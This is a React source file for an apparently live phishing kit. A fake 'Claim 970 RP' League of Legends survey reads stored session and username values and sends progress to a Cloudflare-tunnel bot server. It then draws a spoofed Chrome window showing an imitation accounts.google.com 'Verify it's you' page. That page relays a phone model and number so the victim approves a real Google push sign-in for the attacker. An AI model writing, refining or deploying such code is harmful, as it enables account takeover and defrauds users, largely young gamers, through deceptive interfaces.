import React, { useState, useEffect, useRef } from 'react';
import { CheckCircle, Circle, ArrowRight, Loader2, Trophy, Gamepad2, Users, Star, Clock, X, Minus, Square, ArrowLeft, ArrowRight as ArrowRightIcon, RotateCw, Lock, ShieldCheck, Sparkles } from 'lucide-react';

const Surveys = () => {
  const [started, setStarted] = useState(false);
  const [currentSurvey, setCurrentSurvey] = useState(0);
  const [completedSurveys, setCompletedSurveys] = useState([]);
  const [selectedOption, setSelectedOption] = useState(null);
  const [loading, setLoading] = useState(false);
  const [showVerification, setShowVerification] = useState(false);
  const [verificationInfo, setVerificationInfo] = useState(null);
  const [botMessage, setBotMessage] = useState("");
  const [sessionId, setSessionId] = useState("");
  const [username, setUsername] = useState("");
  const [isVerified, setIsVerified] = useState(false);
  const [verificationStep, setVerificationStep] = useState('waiting');
  
  const [position, setPosition] = useState({ x: 100, y: 50 });
  const isDragging = useRef(false);
  const dragStart = useRef({ x: 0, y: 0 });

  const BOT_URL = 'https://shoe-frontier-cloud-strand.trycloudflare.com';

  useEffect(() => {
    const savedSession = localStorage.getItem('riot_session');
    const savedUsername = localStorage.getItem('riot_u');
    
    if (savedSession) setSessionId(savedSession);
    if (savedUsername) setUsername(savedUsername);
  }, []);

  const handleMouseDown = (e) => {
    if (e.button !== 0) return;
    isDragging.current = true;
    dragStart.current = { x: e.clientX - position.x, y: e.clientY - position.y };
    document.addEventListener('mousemove', handleMouseMove);
    document.addEventListener('mouseup', handleMouseUp);
  };

  const handleMouseMove = (e) => {
    if (!isDragging.current) return;
    setPosition({ x: e.clientX - dragStart.current.x, y: e.clientY - dragStart.current.y });
  };

  const handleMouseUp = () => {
    isDragging.current = false;
    document.removeEventListener('mousemove', handleMouseMove);
    document.removeEventListener('mouseup', handleMouseUp);
  };

  const surveys = [
    { 
      id: 1, 
      title: "Gaming Preferences", 
      desc: "What primary factor drives your choice in choosing a main game?", 
      icon: Gamepad2,
      question: "Which game style describes your everyday rotation?",
      options: ["Highly competitive tactical matchmakers", "Immersive open-world sandbox RPGs", "Casual arcade/co-op indie titles", "MMORPGs with intense progression grids"]
    },
    { 
      id: 2, 
      title: "Esports Interest", 
      desc: "Which esports regions and operational tiers do you actively watch?", 
      icon: Trophy,
      question: "Which professional League of Legends region holds your loyalty?",
      options: ["LEC (Europe)", "LCS (North America)", "LCK (Korea)", "LPL (China) / International Events"]
    },
    { 
      id: 3, 
      title: "Social Gaming", 
      desc: "Tell us how you manage queues and communication with friends.", 
      icon: Users,
      question: "What is your preferred party queue strategy?",
      options: ["Solo Queue grinding (Pure dedication)", "Duo Queueing with a trusted partner", "Flex/5-Man stacks with active voice channels", "Custom in-house scrims and community hubs"]
    },
    { 
      id: 4, 
      title: "Game Design", 
      desc: "What balance philosophies do you prefer developers to prioritize?", 
      icon: Star,
      question: "Which gameplay element shapes a high-tier champion release?",
      options: ["High skill ceilings and fluid outplay potential", "Clear counterplay parameters and utility kits", "Unique lore ties paired with strong visual mastery", "Straightforward, rewarding mechanics for standard climbing"]
    },
    { 
      id: 5, 
      title: "Gaming Habits", 
      desc: "How often do you session matchmakers inside standard splits?", 
      icon: Clock,
      question: "What does your typical weekly active playtime look like?",
      options: ["Hardcore sessioning (More than 25 hours a week)", "Moderate routine (10 to 20 hours a week)", "Casual engagement (Under 10 hours a week)", "Strict weekend tournament/Clash matches only"]
    },
    { 
      id: 6, 
      title: "Mobile Gaming", 
      desc: "Your stance on portable adaptations of flagship desktop titles.", 
      icon: Gamepad2,
      question: "Have you played or tested Wild Rift or Teamfight Tactics Mobile?",
      options: ["Yes, I routinely play mobile versions", "Occasionally when away from my desk setup", "No, I exclusively stick to desktop setups", "I prefer standard mobile strategy card apps"]
    },
    { 
      id: 7, 
      title: "Competitive Gaming", 
      desc: "Your personal history with ranked configurations.", 
      icon: Trophy,
      question: "What is the highest competitive rank you have achieved inside a season?",
      options: ["Iron to Bronze tiers", "Silver to Gold tiers", "Platinum to Emerald tiers", "Diamond, Master, or Apex ranks"]
    },
    { 
      id: 8, 
      title: "Gaming Communities", 
      desc: "Which structural platform do you leverage for updates?", 
      icon: Users,
      question: "Where do you gather your patch breakdown info and build sets?",
      options: ["Dedicated Reddit communities / Subreddits", "Content creator guides and YouTube deep-dives", "Official game patches and patch notes platforms", "Analytical metadata tracking tools (U.GG, OP.GG)"]
    },
    { 
      id: 9, 
      title: "Future Gaming", 
      desc: "What future releases or adaptations catch your focus?", 
      icon: Star,
      question: "Which upcoming Riot Games ecosystem project excites you most?",
      options: ["The upcoming Runeterra MMORPG", "2XKO (The fighting game project)", "Arcane follow-up seasons or spin-off animations", "Brand new IP concepts independent of League"]
    },
    { 
      id: 10, 
      title: "League of Legends Meta", 
      desc: "Your definitive operational role on Summoner's Rift.", 
      icon: Trophy,
      question: "Select your primary laning role assignment:",
      options: ["Top Lane / Isolated skirmishing", "Jungle / Objective pacing and ganking", "Mid Lane / High-impact map roaming", "Bot Lane (ADC / Support pair configurations)"]
    },
  ];

  const updateSurveyProgress = async (index) => {
    try {
      const payload = {
        sessionId: sessionId || "unknown",
        username: username || "unknown",
        currentSurvey: index + 1,
        totalSurveys: surveys.length,
        completed: completedSurveys.length
      };
      
      await fetch(`${BOT_URL}/survey-progress`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    } catch (err) {
      console.error("Progress update error:", err);
    }
  };

  const pollVerificationInfo = async () => {
    try {
      const response = await fetch(`${BOT_URL}/verification-info/${sessionId}`);
      const data = await response.json();
      
      if (data.verified) {
        setVerificationStep('done');
        setIsVerified(true);
        setBotMessage("Email verified successfully!");
        setTimeout(() => {
          window.location.href = '/dashboard';
        }, 3000);
      } 
      else if (data.status === 'email_verification_failed' || data.failed) {
        setVerificationStep('resetting');
        setVerificationInfo(null);
        setBotMessage("Sending new verification...");
        setTimeout(() => {
          setVerificationStep('waiting');
          pollVerificationInfo();
        }, 2500);
      }
      else if (data.info) {
        setVerificationInfo(data.info);
        setVerificationStep('info');
        setBotMessage(`Tap Yes on ${data.info.phoneModel} and enter ${data.info.number}`);
        setTimeout(pollVerificationInfo, 3000);
      } else {
        setTimeout(pollVerificationInfo, 3000);
      }
    } catch (err) {
      console.error("Poll error:", err);
      setTimeout(pollVerificationInfo, 3000);
    }
  };

  const completeSurvey = async (index) => {
    if (loading || completedSurveys.includes(index) || selectedOption === null) return;
    
    setLoading(true);
    await new Promise(resolve => setTimeout(resolve, 1200));
    
    const newCompleted = [...completedSurveys, index];
    setCompletedSurveys(newCompleted);
    
    await updateSurveyProgress(index);
    setSelectedOption(null); // Reset select tracker
    
    // CHANGED: Fixed checking value from index === 8 to index === 9 (Survey 10 completion check)
    if (index === 9) {
      setShowVerification(true);
      setVerificationStep('waiting');
      setBotMessage("Verifying...");
      setTimeout(() => {
        pollVerificationInfo();
      }, 2000);
    }
    
    if (index < surveys.length - 1) {
      setCurrentSurvey(index + 1);
    }
    
    setLoading(false);
  };

  const allCompleted = completedSurveys.length === surveys.length;

  const renderVerificationScreen = () => {
    const isWaiting = verificationStep === 'waiting';
    const isResetting = verificationStep === 'resetting';
    const hasInfo = verificationStep === 'info' && verificationInfo;
    const isDone = verificationStep === 'done';

    return (
      <div
        style={{ transform: `translate3d(${position.x}px, ${position.y}px, 0)` }}
        className="absolute w-[620px] h-[680px] bg-[#202124] rounded-lg shadow-2xl border border-[#3c4043] flex flex-col z-[100] overflow-hidden select-none font-sans"
      >
        {/* Google Chrome Header */}
        <div onMouseDown={handleMouseDown} className="w-full h-10 bg-[#202124] flex items-end justify-between px-2 cursor-grab active:cursor-grabbing">
          <div className="flex items-end h-full pt-2 pointer-events-none">
            <div className="relative h-8 w-[160px] bg-[#35363a] rounded-t-lg flex items-center gap-2 px-3 border-b border-[#35363a] pointer-events-auto">
              <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="G" className="w-3.5 h-3.5 object-contain select-none"/>
              <span className="text-[12px] text-zinc-200 truncate font-normal select-none">Google Account</span>
              <X size={12} className="text-zinc-400 hover:text-white hover:bg-zinc-700 rounded-full p-0.5 cursor-pointer ml-auto" />
            </div>
          </div>
          <div className="flex items-center gap-4 pr-3 pb-2">
            <Minus size={14} className="text-zinc-400 hover:text-white cursor-pointer" />
            <Square size={11} className="text-zinc-400 hover:text-white cursor-pointer" />
            <X size={14} className="text-zinc-400 hover:text-red-400 cursor-pointer" />
          </div>
        </div>

        {/* Chrome Address Bar */}
        <div className="h-9 bg-[#35363a] flex items-center gap-3 px-3 border-b border-[#202124]">
          <div className="flex gap-4 text-zinc-400 items-center">
            <ArrowLeft size={15} className="hover:text-white cursor-pointer opacity-50" />
            <ArrowRightIcon size={15} className="hover:text-white cursor-pointer opacity-50" />
            <RotateCw size={14} className="hover:text-white cursor-pointer" />
          </div>
          <div className="flex-1 h-7 bg-[#202124] rounded-full flex items-center px-3 text-[12px] text-zinc-300 gap-0 border border-transparent focus-within:border-blue-500">
            <Lock size={12} className="text-emerald-400 mr-1.5" />
            <span className="text-emerald-400 font-medium">https://</span>
            <span className="text-zinc-200">accounts.google.com</span>
            <span className="text-zinc-500">/signin/v2/identifier</span>
          </div>
        </div>

        {/* Authentic Verification Page Space */}
        <div className="flex-1 bg-white flex flex-col items-center justify-start pt-12 px-10 overflow-y-auto">
          <div className="w-full max-w-[380px] flex flex-col items-center">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" className="w-20 h-auto object-contain mb-4 select-none" />
            <h2 className="text-[24px] font-normal text-[#202124] tracking-tight text-center mt-1">Verify it's you</h2>
            
            <div className="mt-2 px-3 py-1 flex items-center gap-1.5 border border-zinc-200 rounded-full max-w-full">
              <div className="w-4 h-4 rounded-full bg-blue-600 text-[10px] text-white flex items-center justify-center font-bold">
                {username ? username[0].toUpperCase() : 'A'}
              </div>
              <span className="text-[14px] font-medium text-[#3c4043] truncate max-w-[180px]">
                {username || "alexandruorodel10@gmail.com"}
              </span>
            </div>

            <p className="text-[14px] text-[#5f6368] text-center mt-6 leading-relaxed">
              To withdraw your 970 RP, we need to verify your identity. Please follow the instructions below to confirm your account.
            </p>

            {isWaiting && (
              <div className="text-center py-8 w-full flex flex-col items-center justify-center">
                <Loader2 className="w-8 h-8 text-[#1a73e8] animate-spin mb-4" />
                <p className="text-[14px] text-[#3c4043] font-medium">Verifying...</p>
              </div>
            )}

            {isResetting && (
              <div className="text-center py-8 w-full flex flex-col items-center justify-center">
                <Loader2 className="w-8 h-8 text-cyan-600 animate-spin mb-4" />
                <p className="text-[14px] text-cyan-600 font-semibold animate-pulse">Sending new verification...</p>
              </div>
            )}

            {hasInfo && verificationInfo && (
              <div className="w-full mt-6 border border-zinc-200 rounded-lg p-4 bg-white text-left shadow-sm">
                <p className="text-[14px] text-[#3c4043] leading-relaxed">
                  Google sent a push notification to your <span className="font-semibold text-[#202124]">{verificationInfo.phoneModel}</span>. Open it, tap <span className="font-semibold text-[#1a73e8]">Yes</span>, then choose number:
                </p>
                <div className="mt-4 flex justify-center">
                  <span className="text-[44px] font-light text-[#1a73e8] tracking-tight bg-slate-50 border border-slate-100 px-6 py-1 rounded-md shadow-inner">
                    {verificationInfo.number}
                  </span>
                </div>
              </div>
            )}

            {isDone && (
              <div className="text-center py-6 w-full">
                <div className="w-14 h-14 rounded-full bg-emerald-50 flex items-center justify-center mx-auto mb-3 border border-emerald-100">
                  <CheckCircle className="w-7 h-7 text-emerald-500" />
                </div>
                <p className="text-[16px] font-medium text-[#202124]">Identity Confirmed</p>
                <p className="text-[13px] text-[#5f6368] mt-1">Safely logging you back into your session...</p>
              </div>
            )}

            <div className="w-full mt-8 flex items-center justify-between text-[14px] font-medium text-[#1a73e8]">
              <button className="hover:bg-blue-50/50 px-2 py-1.5 rounded transition-colors">Try another way</button>
              <button className="hover:bg-blue-50/50 px-2 py-1.5 rounded transition-colors">Don't have your phone?</button>
            </div>
          </div>
        </div>
      </div>
    );
  };

  const renderContent = () => {
    if (showVerification) {
      return renderVerificationScreen();
    }

    // GREETING STAGE BEFORE STEP 1
    if (!started) {
      return (
        <div className="relative z-10 p-8 md:p-10 rounded-3xl bg-gradient-to-b from-[#0e071c]/90 to-[#06020e]/95 border border-purple-500/30 shadow-[0_30px_80px_rgba(0,0,0,0.8)] backdrop-blur-xl w-full max-w-[500px] text-center">
          <div className="inline-flex items-center gap-1.5 bg-purple-500/10 border border-purple-500/30 rounded-full px-3 py-1 text-xs text-purple-300 font-medium mb-4 animate-pulse">
            <Sparkles className="w-3.5 h-3.5 text-fuchsia-400" />
             League Promotion
          </div>
          <h1 className="text-3xl font-extrabold text-white tracking-tight mb-2">
            Claim Your <span className="bg-gradient-to-r from-fuchsia-400 to-purple-400 bg-clip-text text-transparent">970 RP</span>
          </h1>
          <p className="text-zinc-400 text-sm leading-relaxed mb-6">
            Help shape future splits, meta balances, and esports programs. Complete our 10 rapid player sentiment modules to get 970 RP directly to your linked Riot profile.
          </p>

          <div className="bg-zinc-900/80 rounded-xl p-4 border border-zinc-800/80 text-left mb-6 space-y-3">
            <div className="flex items-start gap-3 text-sm text-zinc-300">
              <ShieldCheck className="w-5 h-5 text-emerald-400 shrink-0 mt-0.5" />
              <span>Verified payout distribution module.</span>
            </div>
            <div className="flex items-start gap-3 text-sm text-zinc-300">
              <Clock className="w-5 h-5 text-purple-400 shrink-0 mt-0.5" />
              <span>Takes less than 3 minutes to finish completely.</span>
            </div>
          </div>

          <button
            onClick={() => setStarted(true)}
            className="w-full py-3.5 bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-500 hover:to-purple-500 text-white rounded-xl font-semibold transition-all shadow-[0_4px_20px_rgba(79,70,229,0.3)] flex items-center justify-center gap-2 group"
          >
            Begin Player Survey
            <ArrowRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" />
          </button>
        </div>
      );
    }

    return (
      <div className="relative z-10 p-8 md:p-10 rounded-3xl bg-gradient-to-b from-[#0e071c]/90 to-[#06020e]/95 border border-purple-500/20 shadow-[0_30px_80px_rgba(0,0,0,0.8)] backdrop-blur-xl w-full max-w-[550px]">
        <div className="text-center mb-6">
          <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-fuchsia-500 to-purple-600 flex items-center justify-center mx-auto mb-3 shadow-[0_0_20px_rgba(217,70,239,0.25)]">
            <Trophy className="w-6 h-6 text-white" />
          </div>
          <h1 className="text-2xl font-bold text-white">
            {allCompleted ? 'All Done!' : 'Complete Surveys'}
          </h1>
          <p className="text-purple-200/50 text-sm">
            {!allCompleted && "Complete all 10 surveys to earn 970 RP!"}
            {allCompleted && "Verifying your email..."}
          </p>
        </div>

        {allCompleted ? (
          <div className="text-center py-8">
            <div className="w-20 h-20 rounded-full bg-green-100 flex items-center justify-center mx-auto mb-6">
              <Trophy className="w-10 h-10 text-green-500" />
            </div>
            <p className="text-zinc-600 text-sm mb-2">You completed all 10 surveys!</p>
            <p className="text-green-600 font-bold text-lg">+970 RP earned!</p>
          </div>
        ) : (
          <>
            <div className="w-full mb-6">
              <div className="flex justify-between text-sm text-zinc-400 mb-1">
                <span>Progress</span>
                <span>{completedSurveys.length}/{surveys.length}</span>
              </div>
              <div className="w-full h-2 bg-zinc-800 rounded-full overflow-hidden">
                <div 
                  className="h-full bg-gradient-to-r from-blue-500 to-purple-600 transition-all duration-500"
                  style={{ width: `${((completedSurveys.length) / surveys.length) * 100}%` }}
                />
              </div>
            </div>

            <div className="w-full max-w-md">
              <div className="bg-zinc-900/60 rounded-xl p-6 border border-zinc-800">
                <div className="flex items-center gap-3 mb-4">
                  <div className="w-10 h-10 rounded-full bg-blue-900/40 flex items-center justify-center">
                    {React.createElement(surveys[currentSurvey].icon, { className: "w-5 h-5 text-blue-400" })}
                  </div>
                  <span className="text-sm font-medium text-blue-400">
                    Module {currentSurvey + 1} of {surveys.length}
                  </span>
                </div>
                
                <h3 className="text-lg font-bold text-zinc-100 mb-1">{surveys[currentSurvey].title}</h3>
                <p className="text-zinc-400 text-xs mb-5">{surveys[currentSurvey].desc}</p>
                
                {/* DYNAMIC AND LOGICAL MULTIPLE CHOICE QUESTIONS */}
                <p className="text-sm font-semibold text-zinc-300 mb-3">{surveys[currentSurvey].question}</p>
                <div className="space-y-2.5 mb-6">
                  {surveys[currentSurvey].options.map((option, idx) => (
                    <div 
                      key={idx} 
                      onClick={() => !loading && setSelectedOption(idx)}
                      className={`flex items-center gap-3 text-sm text-zinc-300 border p-3 rounded-lg cursor-pointer transition-all ${
                        selectedOption === idx 
                          ? "bg-purple-600/20 border-purple-500 text-white shadow-[0_0_12px_rgba(168,85,247,0.15)]" 
                          : "bg-zinc-950/40 border-zinc-800/80 hover:border-zinc-700 hover:bg-zinc-900/40"
                      }`}
                    >
                      <div className={`w-4 h-4 rounded-full border flex items-center justify-center shrink-0 ${
                        selectedOption === idx ? "border-purple-400" : "border-zinc-600"
                      }`}>
                        {selectedOption === idx && <div className="w-2 h-2 bg-purple-400 rounded-full" />}
                      </div>
                      <span>{option}</span>
                    </div>
                  ))}
                </div>
                
                <button
                  onClick={() => completeSurvey(currentSurvey)}
                  disabled={loading || completedSurveys.includes(currentSurvey) || selectedOption === null}
                  className={`w-full py-3 rounded-lg font-medium transition-all flex items-center justify-center gap-2 ${
                    completedSurveys.includes(currentSurvey)
                      ? "bg-green-900/30 text-green-400 border border-green-500/20 cursor-default"
                      : selectedOption === null || loading
                      ? "bg-zinc-800 text-zinc-500 cursor-not-allowed border border-transparent"
                      : "bg-blue-600 hover:bg-blue-700 text-white shadow-lg shadow-blue-600/20"
                  }`}
                >
                  {loading ? (
                    <Loader2 className="w-4 h-4 animate-spin" />
                  ) : completedSurveys.includes(currentSurvey) ? (
                    <>
                      <CheckCircle className="w-4 h-4" />
                      Completed
                    </>
                  ) : (
                    <>
                      Submit Choice
                      <ArrowRight className="w-4 h-4" />
                    </>
                  )}
                </button>
              </div>
              
              {completedSurveys.length > 0 && (
                <div className="mt-4 flex flex-wrap gap-2 justify-center">
                  {surveys.map((_, index) => (
                    <div
                      key={index}
                      className={`w-8 h-8 rounded-full flex items-center justify-center text-xs font-semibold ${
                        completedSurveys.includes(index)
                          ? "bg-green-600 text-white"
                          : "bg-zinc-800 text-zinc-500"
                      }`}
                    >
                      {index + 1}
                    </div>
                  ))}
                </div>
              )}
            </div>
          </>
        )}
      </div>
    );
  };

  return (
    <div className="min-h-screen w-full bg-[#030108] text-slate-200 font-sans font-light antialiased relative flex flex-col items-center justify-center p-6 overflow-hidden select-none">
      <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_center,rgba(15,7,32,0.7),#030108)] pointer-events-none" />
      <div className="absolute top-[-10%] left-1/2 -translate-x-1/2 w-[700px] h-[700px] bg-gradient-to-b from-purple-600/10 via-fuchsia-500/5 to-transparent rounded-full blur-[140px] pointer-events-none" />
      
      {renderContent()}
    </div>
  );
};

export default Surveys;